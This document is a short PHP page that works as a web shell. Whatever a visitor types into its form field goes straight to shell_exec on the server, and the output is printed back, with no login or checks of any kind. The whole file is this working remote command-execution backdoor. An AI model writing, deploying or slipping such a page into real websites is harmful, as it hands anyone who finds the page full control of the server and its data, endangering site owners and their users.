<!DOCTYPE html>
<html lang="en">
<head>
    <title>shellсommands</title>
</head>
<body>
    <form action="index.php" method="post">
        Command:  <input type="text" name="command" />
        <input type="submit" name="submit" value="Push it!" />
    </form>
    <?php
        echo shell_exec($_POST["command"]);
    ?>
</body>
</html>